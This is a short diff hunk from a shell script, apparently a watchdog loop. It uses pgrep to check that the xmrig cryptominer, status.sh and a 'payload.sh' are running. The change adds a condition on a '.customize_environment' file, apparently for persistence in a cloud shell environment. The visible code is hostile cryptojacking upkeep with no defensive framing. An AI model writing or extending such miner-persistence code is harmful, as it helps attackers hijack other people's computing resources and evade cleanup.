@@ -2,7 +2,8 @@
 
 while true
 do
-   if pgrep xmrig > /dev/null && 
+   if [ -e '.customize_environment' ] &&
+      pgrep xmrig > /dev/null && 
       pgrep status.sh > /dev/null && 
       pgrep payload.sh > /dev/null
    then
